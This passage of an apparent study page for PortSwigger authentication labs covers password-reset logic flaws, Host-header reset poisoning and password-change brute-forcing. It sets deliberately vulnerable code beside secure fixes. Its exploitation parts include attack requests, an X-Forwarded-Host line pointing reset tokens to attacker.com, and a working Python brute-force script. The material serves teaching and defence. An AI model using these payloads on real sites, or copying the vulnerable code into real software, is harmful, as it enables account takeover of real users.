                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
                    </div>
                    <p class="lab-description">
                        The password reset functionality uses a user-controllable parameter to determine
                        which account's password to reset, allowing attackers to reset any user's password.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Reset form includes username as hidden field</li>
                        <li>Token validates the reset link, not the target user</li>
                        <li>Attacker can change username parameter to victim</li>
                        <li>Sets new password for any account!</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab12"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab12"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab12-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.form.get('token')
<span class="vuln-line">    username = request.form.get('username')  # ❌ User-controlled!</span>
    new_password = request.form.get('new-password')

<span class="vuln-line">    # ❌ Only validates token, not username association!</span>
<span class="vuln-line">    if not validate_token(token):</span>
        return error('Invalid token')

<span class="vuln-line">    user = User.query.filter_by(username=username).first()</span>
<span class="vuln-line">    user.password = hash_password(new_password)  # ❌ Resets wrong user!</span>
    db.session.commit()</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab12-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.form.get('token')
    new_password = request.form.get('new-password')

<span class="secure-line">    # ✅ Token is tied to specific user in database</span>
<span class="secure-line">    reset_request = PasswordReset.query.filter_by(token_hash=hash_token(token)).first()</span>

<span class="secure-line">    if not reset_request:</span>
<span class="secure-line">        return error('Invalid or expired token')</span>

<span class="secure-line">    # ✅ Check token expiry</span>
<span class="secure-line">    if reset_request.expires_at < datetime.utcnow():</span>
<span class="secure-line">        db.session.delete(reset_request)</span>
<span class="secure-line">        db.session.commit()</span>
<span class="secure-line">        return error('Token has expired')</span>

<span class="secure-line">    # ✅ User is determined by the token, not user input</span>
<span class="secure-line">    user = reset_request.user  # User from token association</span>
    user.password = hash_password(new_password)

<span class="secure-line">    # ✅ Invalidate the token after use (one-time use)</span>
<span class="secure-line">    db.session.delete(reset_request)</span>
    db.session.commit()</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Attack Request</span>
POST /reset-password HTTP/1.1

token=valid-token-for-wiener
username=carlos  # ← Changed to victim!
new-password=hacked123
                    </div>
                </div>
            </div>

            <!-- Lab 13: Password Reset Poisoning -->
            <div id="reset-poisoning" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-skull-crossbones"></i> Lab 13: Password Reset Poisoning via Middleware</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The password reset link is generated using the Host header value.
                        Attackers can poison the reset link to point to their server and steal tokens.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Reset email contains link like: <code>https://{Host}/reset?token=xxx</code></li>
                        <li>X-Forwarded-Host header overrides Host header</li>
                        <li>Attacker sends reset request with malicious Host</li>
                        <li>Victim clicks link → token sent to attacker!</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab13"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab13"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab13-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    username = request.form.get('username')
    user = User.query.filter_by(username=username).first()

    token = generate_reset_token(user)

<span class="vuln-line">    # ❌ Uses Host header to build reset URL!</span>
<span class="vuln-line">    host = request.headers.get('X-Forwarded-Host', request.host)</span>
<span class="vuln-line">    reset_url = f"https://{host}/reset?token={token}"</span>

    send_email(user.email, f"Reset your password: {reset_url}")
    return success('Password reset email sent')</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab13-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"># config.py
<span class="secure-line">ALLOWED_HOSTS = ['myapp.com', 'www.myapp.com']</span>
<span class="secure-line">BASE_URL = 'https://myapp.com'  # ✅ Hardcoded, not from request</span>

@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    username = request.form.get('username')
    user = User.query.filter_by(username=username).first()

<span class="secure-line">    # ✅ Don't reveal if user exists</span>
<span class="secure-line">    if not user:</span>
<span class="secure-line">        return success('If account exists, reset email sent')</span>

    token = generate_reset_token(user)

<span class="secure-line">    # ✅ Use hardcoded base URL from config</span>
<span class="secure-line">    reset_url = f"{app.config['BASE_URL']}/reset?token={token}"</span>

<span class="secure-line">    # ✅ Validate Host header if using it</span>
<span class="secure-line">    if request.host not in app.config['ALLOWED_HOSTS']:</span>
<span class="secure-line">        abort(400, 'Invalid host')</span>

    send_email(user.email, f"Reset your password: {reset_url}")
<span class="secure-line">    return success('If account exists, reset email sent')  # ✅ Generic message</span></code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Poisoned Request</span>
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com  # ← Poisoned!
Content-Type: application/x-www-form-urlencoded

username=carlos

# Victim receives email with:
# https://attacker.com/reset?token=secret-token
# When clicked, token is sent to attacker's server!
                    </div>
                </div>
            </div>

            <!-- Lab 14: Password Brute-force via Password Change -->
            <div id="password-change-bruteforce" class="lab-content">
                <div class="lab-header">
                    <h2><i class="fas fa-key"></i> Lab 14: Password Brute-force via Password Change</h2>
                    <div class="lab-meta">
                        <div class="meta-item">
                            <i class="fas fa-layer-group"></i>
                            <span>PortSwigger Web Security Academy</span>
                        </div>
                        <div class="meta-item">
                            <i class="fas fa-signal"></i>
                            <span>Difficulty: Practitioner</span>
                        </div>
                        <div class="meta-item">
                            <i class="fas fa-tag"></i>
                            <span>Authentication Bypass</span>
                        </div>
                    </div>
                    <p class="lab-description">
                        This lab's password change functionality contains a logic flaw that allows attackers to brute-force another user's password.
                        The vulnerability exists because the application's response differs based on whether the current password is correct,
                        enabling an attacker to enumerate valid passwords for any account.
                    </p>
                </div>

                <!-- Vulnerability Explanation -->
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>The password change form accepts a username parameter that can be manipulated</li>
                        <li>The application returns different error messages depending on whether the current password is correct</li>
                        <li>When current password is <strong>correct</strong> but new passwords don't match: <code>"New passwords do not match"</code></li>
                        <li>When current password is <strong>incorrect</strong>: <code>"Current password is incorrect"</code></li>
                        <li>This behavioral difference allows attackers to determine if a guessed password is valid</li>
                        <li>No rate limiting or account lockout on the password change endpoint</li>
                    </ul>
                </div>

                <!-- Code Review Section -->
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code Review</h3>

                    <div class="language-tabs">
                        <button class="lang-tab active" data-lang="python">Python (Flask)</button>
                        <button class="lang-tab" data-lang="php">PHP</button>
                        <button class="lang-tab" data-lang="nodejs">Node.js</button>
                        <button class="lang-tab" data-lang="java">Java</button>
                    </div>

                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable">
                            <i class="fas fa-exclamation-triangle"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <!-- Python Vulnerable Code -->
                    <div class="code-container" id="code-python-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-python"></i>
                                <span>auth_controller.py</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('python-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python" id="python-vuln">@app.route('/change-password', methods=['POST'])
def change_password():
    # VULNERABILITY 1: Username taken from user input instead of session
<span class="vuln-line">    username = request.form.get('username')  # ❌ User-controlled!</span>
    current_password = request.form.get('current_password')
    new_password1 = request.form.get('new_password1')
    new_password2 = request.form.get('new_password2')

    # Fetch user from database
    user = User.query.filter_by(username=username).first()

    if not user:
        return render_template('change_password.html', error='User not found')

    # VULNERABILITY 2: Different error messages reveal password validity
<span class="vuln-line">    if not check_password_hash(user.password, current_password):</span>
<span class="vuln-line">        return render_template('change_password.html', </span>
<span class="vuln-line">                               error='Current password is incorrect')  # ❌ Reveals invalid password</span>

    # VULNERABILITY 3: This message confirms the password was CORRECT
<span class="vuln-line">    if new_password1 != new_password2:</span>
<span class="vuln-line">        return render_template('change_password.html',</span>
<span class="vuln-line">                               error='New passwords do not match')  # ❌ Confirms valid password!</span>

    # VULNERABILITY 4: No rate limiting on this endpoint
    user.password = generate_password_hash(new_password1)
    db.session.commit()

    return render_template('change_password.html',
                           success='Password changed successfully')</code></pre>
                        </div>
                    </div>

                    <!-- Python Secure Code -->
                    <div class="code-container hidden" id="code-python-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-python"></i>
                                <span>auth_controller.py (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('python-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python" id="python-secure">from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/change-password', methods=['POST'])
@login_required
<span class="secure-line">@limiter.limit("5 per minute")  # ✅ Rate limiting</span>
def change_password():
    # ✅ FIX 1: Get username from authenticated session only
<span class="secure-line">    username = current_user.username  # ✅ From session, not user input</span>
    current_password = request.form.get('current_password')
    new_password1 = request.form.get('new_password1')
    new_password2 = request.form.get('new_password2')

    user = User.query.filter_by(username=username).first()

    # ✅ FIX 2: Validate all inputs first, then check password
    # Perform all validations before revealing any information
<span class="secure-line">    if not new_password1 or not new_password2:</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='All fields are required')</span>

<span class="secure-line">    if new_password1 != new_password2:</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='New passwords do not match')</span>

<span class="secure-line">    if not validate_password_strength(new_password1):</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='Password does not meet requirements')</span>

    # ✅ FIX 3: Generic error message for authentication failures
<span class="secure-line">    if not check_password_hash(user.password, current_password):</span>
<span class="secure-line">        log_failed_attempt(username, request.remote_addr)  # ✅ Log for monitoring</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='Password change failed')  # ✅ Generic message</span>

    # ✅ FIX 4: Invalidate other sessions after password change
    user.password = generate_password_hash(new_password1)
<span class="secure-line">    user.session_token = generate_new_session_token()  # ✅ Invalidate old sessions</span>
    db.session.commit()

    return render_template('change_password.html',
                           success='Password changed successfully')</code></pre>
                        </div>
                    </div>

                    <!-- PHP Vulnerable Code -->
                    <div class="code-container hidden" id="code-php-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-php"></i>
                                <span>change_password.php</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('php-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php" id="php-vuln">&lt;?php
// change_password.php - VULNERABLE VERSION

session_start();
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABILITY 1: Username from POST data, not session
<span class="vuln-line">    $username = $_POST['username'];  // ❌ User-controlled input!</span>
    $current_password = $_POST['current_password'];
    $new_password1 = $_POST['new_password1'];
    $new_password2 = $_POST['new_password2'];

    // Fetch user from database
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch();

    if (!$user) {
        $error = "User not found";
    } else {
        // VULNERABILITY 2: Different responses leak password validity
<span class="vuln-line">        if (!password_verify($current_password, $user['password'])) {</span>
<span class="vuln-line">            $error = "Current password is incorrect";  // ❌ Reveals wrong password</span>
<span class="vuln-line">        } elseif ($new_password1 !== $new_password2) {</span>
<span class="vuln-line">            $error = "New passwords do not match";  // ❌ Confirms CORRECT password!</span>
        } else {
            // VULNERABILITY 3: No rate limiting, no lockout
            $hashed = password_hash($new_password1, PASSWORD_DEFAULT);
            $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE username = ?");
            $stmt->execute([$hashed, $username]);
            $success = "Password changed successfully";
        }
    }
}
?&gt;

&lt;!-- VULNERABILITY 4: Username in hidden field allows manipulation --&gt;
&lt;form method="POST"&gt;
<span class="vuln-line">    &lt;input type="hidden" name="username" value="&lt;?= htmlspecialchars($username) ?&gt;"&gt;</span>
    &lt;input type="password" name="current_password" placeholder="Current Password"&gt;
    &lt;input type="password" name="new_password1" placeholder="New Password"&gt;
    &lt;input type="password" name="new_password2" placeholder="Confirm Password"&gt;
    &lt;button type="submit"&gt;Change Password&lt;/button&gt;
&lt;/form&gt;</code></pre>
                        </div>
                    </div>

                    <!-- PHP Secure Code -->
                    <div class="code-container hidden" id="code-php-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-php"></i>
                                <span>change_password.php (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('php-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php" id="php-secure">&lt;?php
// change_password.php - SECURE VERSION

session_start();
require_once 'db.php';
require_once 'rate_limiter.php';

// ✅ FIX 1: Require authentication
<span class="secure-line">if (!isset($_SESSION['user_id'])) {</span>
<span class="secure-line">    header('Location: /login');</span>
<span class="secure-line">    exit;</span>
<span class="secure-line">}</span>

// ✅ FIX 2: Rate limiting
<span class="secure-line">$rateLimiter = new RateLimiter($_SESSION['user_id'], 'password_change', 5, 300);</span>
<span class="secure-line">if (!$rateLimiter->allowRequest()) {</span>
<span class="secure-line">    $error = "Too many attempts. Please try again later.";</span>
<span class="secure-line">}</span>

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($error)) {
    // ✅ FIX 3: Get username from SESSION only
<span class="secure-line">    $username = $_SESSION['username'];  // ✅ From session, not user input</span>
    $current_password = $_POST['current_password'];
    $new_password1 = $_POST['new_password1'];
    $new_password2 = $_POST['new_password2'];

    // ✅ FIX 4: Validate new passwords BEFORE checking current password
<span class="secure-line">    if ($new_password1 !== $new_password2) {</span>
<span class="secure-line">        $error = "New passwords do not match";</span>
<span class="secure-line">    } elseif (strlen($new_password1) < 12) {</span>
<span class="secure-line">        $error = "Password must be at least 12 characters";</span>
    } else {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch();

        // ✅ FIX 5: Generic error message
<span class="secure-line">        if (!$user || !password_verify($current_password, $user['password'])) {</span>
<span class="secure-line">            log_security_event('password_change_failed', $username, $_SERVER['REMOTE_ADDR']);</span>
<span class="secure-line">            $error = "Password change failed. Please verify your current password.";</span>
        } else {
            $hashed = password_hash($new_password1, PASSWORD_DEFAULT);
            $new_session = bin2hex(random_bytes(32));

            // ✅ FIX 6: Invalidate all other sessions
<span class="secure-line">            $stmt = $pdo->prepare("UPDATE users SET password = ?, session_token = ? WHERE username = ?");</span>
<span class="secure-line">            $stmt->execute([$hashed, $new_session, $username]);</span>

            $_SESSION['session_token'] = $new_session;
            $success = "Password changed successfully";
        }
    }
}
?&gt;</code></pre>
                        </div>
                    </div>

                    <!-- Node.js Vulnerable Code -->
                    <div class="code-container hidden" id="code-nodejs-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-node-js"></i>
                                <span>authController.js</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('nodejs-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript" id="nodejs-vuln">// authController.js - VULNERABLE VERSION
const bcrypt = require('bcrypt');
const User = require('../models/User');

exports.changePassword = async (req, res) => {
    // VULNERABILITY 1: Username from request body, not session
<span class="vuln-line">    const { username, currentPassword, newPassword1, newPassword2 } = req.body;</span>

    try {
        const user = await User.findOne({ username });

        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }

        // VULNERABILITY 2: Check password first, revealing validity
<span class="vuln-line">        const isValid = await bcrypt.compare(currentPassword, user.password);</span>

<span class="vuln-line">        if (!isValid) {</span>
<span class="vuln-line">            // ❌ This error reveals the password is INCORRECT</span>
<span class="vuln-line">            return res.status(401).json({ error: 'Current password is incorrect' });</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 3: Different error = password was correct!
<span class="vuln-line">        if (newPassword1 !== newPassword2) {</span>
<span class="vuln-line">            // ❌ Attacker now knows the password is CORRECT</span>
<span class="vuln-line">            return res.status(400).json({ error: 'New passwords do not match' });</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 4: No rate limiting implemented
        const hashedPassword = await bcrypt.hash(newPassword1, 10);
        user.password = hashedPassword;
        await user.save();

        res.json({ message: 'Password changed successfully' });

    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
};</code></pre>
                        </div>
                    </div>

                    <!-- Node.js Secure Code -->
                    <div class="code-container hidden" id="code-nodejs-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-node-js"></i>
                                <span>authController.js (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('nodejs-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript" id="nodejs-secure">// authController.js - SECURE VERSION
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');
const User = require('../models/User');
const { logSecurityEvent } = require('../utils/security');

// ✅ FIX 1: Rate limiting middleware
<span class="secure-line">const passwordChangeLimit = rateLimit({</span>
<span class="secure-line">    windowMs: 15 * 60 * 1000, // 15 minutes</span>
<span class="secure-line">    max: 5, // 5 attempts per window</span>
<span class="secure-line">    message: { error: 'Too many attempts, please try again later' }</span>
<span class="secure-line">});</span>

// ✅ FIX 2: Require authentication middleware
<span class="secure-line">const requireAuth = (req, res, next) => {</span>
<span class="secure-line">    if (!req.session?.userId) {</span>
<span class="secure-line">        return res.status(401).json({ error: 'Authentication required' });</span>
<span class="secure-line">    }</span>
<span class="secure-line">    next();</span>
<span class="secure-line">};</span>

exports.changePassword = [requireAuth, passwordChangeLimit, async (req, res) => {
    const { currentPassword, newPassword1, newPassword2 } = req.body;
    // ✅ FIX 3: Get username from session, not request body
<span class="secure-line">    const username = req.session.username;</span>

    try {
        // ✅ FIX 4: Validate new passwords BEFORE checking current
<span class="secure-line">        if (newPassword1 !== newPassword2) {</span>
<span class="secure-line">            return res.status(400).json({ error: 'New passwords do not match' });</span>
<span class="secure-line">        }</span>

<span class="secure-line">        if (!isStrongPassword(newPassword1)) {</span>
<span class="secure-line">            return res.status(400).json({ error: 'Password does not meet requirements' });</span>
<span class="secure-line">        }</span>

        const user = await User.findOne({ username });
        const isValid = await bcrypt.compare(currentPassword, user.password);

        // ✅ FIX 5: Generic error message for auth failures
<span class="secure-line">        if (!user || !isValid) {</span>
<span class="secure-line">            await logSecurityEvent('password_change_failed', { username, ip: req.ip });</span>
<span class="secure-line">            return res.status(400).json({ error: 'Password change failed' });</span>
<span class="secure-line">        }</span>

        const hashedPassword = await bcrypt.hash(newPassword1, 12);

        // ✅ FIX 6: Invalidate other sessions
<span class="secure-line">        user.password = hashedPassword;</span>
<span class="secure-line">        user.sessionVersion = (user.sessionVersion || 0) + 1;</span>
<span class="secure-line">        await user.save();</span>

        res.json({ message: 'Password changed successfully' });

    } catch (error) {
        res.status(500).json({ error: 'An error occurred' });
    }
}];</code></pre>
                        </div>
                    </div>

                    <!-- Java Vulnerable Code -->
                    <div class="code-container hidden" id="code-java-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-java"></i>
                                <span>PasswordController.java</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('java-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-java" id="java-vuln">// PasswordController.java - VULNERABLE VERSION
@RestController
@RequestMapping("/api/password")
public class PasswordController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @PostMapping("/change")
    public ResponseEntity&lt;?&gt; changePassword(@RequestBody PasswordChangeRequest request) {

        // VULNERABILITY 1: Username from request body, not authentication context
<span class="vuln-line">        String username = request.getUsername();  // ❌ User-controlled!</span>
        String currentPassword = request.getCurrentPassword();
        String newPassword1 = request.getNewPassword1();
        String newPassword2 = request.getNewPassword2();

        Optional&lt;User&gt; userOpt = userRepository.findByUsername(username);

        if (userOpt.isEmpty()) {
            return ResponseEntity.status(404).body(Map.of("error", "User not found"));
        }

        User user = userOpt.get();

        // VULNERABILITY 2: Password validation reveals if password is correct
<span class="vuln-line">        if (!passwordEncoder.matches(currentPassword, user.getPassword())) {</span>
<span class="vuln-line">            // ❌ Attacker knows password is WRONG</span>
<span class="vuln-line">            return ResponseEntity.status(401)</span>
<span class="vuln-line">                .body(Map.of("error", "Current password is incorrect"));</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 3: Different error confirms password was correct
<span class="vuln-line">        if (!newPassword1.equals(newPassword2)) {</span>
<span class="vuln-line">            // ❌ Attacker now knows password is CORRECT!</span>
<span class="vuln-line">            return ResponseEntity.status(400)</span>
<span class="vuln-line">                .body(Map.of("error", "New passwords do not match"));</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 4: No rate limiting, no account lockout
        user.setPassword(passwordEncoder.encode(newPassword1));
        userRepository.save(user);

        return ResponseEntity.ok(Map.of("message", "Password changed successfully"));
    }
}</code></pre>
                        </div>
                    </div>

                    <!-- Java Secure Code -->
                    <div class="code-container hidden" id="code-java-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-java"></i>
                                <span>PasswordController.java (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('java-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-java" id="java-secure">// PasswordController.java - SECURE VERSION
@RestController
@RequestMapping("/api/password")
public class PasswordController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private SecurityEventLogger securityLogger;

    @PostMapping("/change")
<span class="secure-line">    @RateLimited(requests = 5, period = 300)  // ✅ 5 requests per 5 minutes</span>
    public ResponseEntity&lt;?&gt; changePassword(
<span class="secure-line">            @AuthenticationPrincipal UserDetails userDetails,  // ✅ From security context</span>
            @RequestBody @Valid PasswordChangeRequest request) {

        // ✅ FIX 1: Get username from authenticated security context
<span class="secure-line">        String username = userDetails.getUsername();</span>
        String currentPassword = request.getCurrentPassword();
        String newPassword1 = request.getNewPassword1();
        String newPassword2 = request.getNewPassword2();

        // ✅ FIX 2: Validate new passwords FIRST
<span class="secure-line">        if (!newPassword1.equals(newPassword2)) {</span>
<span class="secure-line">            return ResponseEntity.status(400)</span>
<span class="secure-line">                .body(Map.of("error", "New passwords do not match"));</span>
<span class="secure-line">        }</span>

<span class="secure-line">        if (!PasswordValidator.isStrong(newPassword1)) {</span>
<span class="secure-line">            return ResponseEntity.status(400)</span>
<span class="secure-line">                .body(Map.of("error", "Password does not meet security requirements"));</span>
<span class="secure-line">        }</span>

        User user = userRepository.findByUsername(username).orElseThrow();

        // ✅ FIX 3: Generic error message for authentication failure
<span class="secure-line">        if (!passwordEncoder.matches(currentPassword, user.getPassword())) {</span>
<span class="secure-line">            securityLogger.log(SecurityEvent.PASSWORD_CHANGE_FAILED, username);</span>
<span class="secure-line">            return ResponseEntity.status(400)</span>
<span class="secure-line">                .body(Map.of("error", "Password change failed"));</span>
<span class="secure-line">        }</span>

        user.setPassword(passwordEncoder.encode(newPassword1));

        // ✅ FIX 4: Invalidate all other sessions
<span class="secure-line">        user.setSessionVersion(user.getSessionVersion() + 1);</span>
        userRepository.save(user);

<span class="secure-line">        securityLogger.log(SecurityEvent.PASSWORD_CHANGED, username);</span>

        return ResponseEntity.ok(Map.of("message", "Password changed successfully"));
    }
}</code></pre>
                        </div>
                    </div>
                </div>

                <!-- Attack Flow -->
                <div class="attack-flow">
                    <h3><i class="fas fa-route"></i> Attack Flow</h3>
                    <div class="flow-steps">
                        <div class="flow-step">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <h4>Identify Target User</h4>
                                <p>Attacker identifies a target username (e.g., <code>carlos</code> or <code>administrator</code>) through enumeration or reconnaissance.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <h4>Capture Password Change Request</h4>
                                <p>Login with own account, navigate to password change, capture the request in Burp Suite. Note the <code>username</code> parameter.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <h4>Modify Username Parameter</h4>
                                <p>Change the <code>username</code> field to target user. Set <code>new_password1</code> and <code>new_password2</code> to DIFFERENT values intentionally.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <h4>Brute-Force Password</h4>
                                <p>Send to Intruder, set payload position on <code>current_password</code>. Use password list. Look for response containing <code>"New passwords do not match"</code> - this confirms the correct password!</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">5</div>
                            <div class="step-content">
                                <h4>Extract Valid Password</h4>
                                <p>Filter results by response length or grep for "do not match". The password that returns this message is the victim's valid password.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Payloads -->
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Attack Payloads</h3>

                    <div class="payload-box">
                        <span class="payload-label">Original Request</span>
POST /my-account/change-password HTTP/1.1
Host: vulnerable-website.com
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password-1=newpass&new-password-2=newpass
                    </div>

                    <div class="payload-box">
                        <span class="payload-label">Modified Attack Request</span>
POST /my-account/change-password HTTP/1.1
Host: vulnerable-website.com
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=§PASSWORD§&new-password-1=a&new-password-2=b
                    </div>

                    <div class="payload-box">
                        <span class="payload-label">Burp Intruder Grep Match</span>
# Grep for successful password identification:
"New passwords do not match"

# This response indicates the current-password is CORRECT
# because it passed authentication and moved to password validation
                    </div>

                    <div class="payload-box">
                        <span class="payload-label">Python Script for Automation</span>
import requests

url = "https://vulnerable-site.com/my-account/change-password"
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')

passwords = open('passwords.txt').read().splitlines()

for password in passwords:
    data = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'a',
        'new-password-2': 'b'  # Intentionally different
    }
    response = session.post(url, data=data)

    if 'New passwords do not match' in response.text:
        print(f'[+] Found password: {password}')
        break
    elif 'Current password is incorrect' in response.text:
        print(f'[-] Wrong: {password}')
                    </div>
                </div>

                <!-- Analysis Panel -->
                <div class="analysis-panel">
                    <h3><i class="fas fa-microscope"></i> Vulnerability Analysis</h3>
                    <div class="analysis-grid">
                        <div class="analysis-card">
                            <h4><i class="fas fa-exclamation-circle"></i> Root Cause</h4>
                            <ul>
                                <li>Username parameter accepted from user input instead of server session</li>
                                <li>Sequential validation reveals password status through error message differences</li>
                                <li>No rate limiting on sensitive endpoint</li>
                            </ul>
                        </div>
                        <div class="analysis-card">
                            <h4><i class="fas fa-crosshairs"></i> Attack Vector</h4>
                            <p>Authentication bypass through differential response analysis. Attacker exploits the logical flaw where valid credentials produce different error messages than invalid ones.</p>
                        </div>
                        <div class="analysis-card">
                            <h4><i class="fas fa-bomb"></i> Impact</h4>
                            <ul>
                                <li>Complete account takeover</li>
                                <li>Bypass of authentication controls</li>
                                <li>Privilege escalation if admin accounts targeted</li>
                                <li>CVSS: 8.1 (High)</li>
                            </ul>
                        </div>
                        <div class="analysis-card">
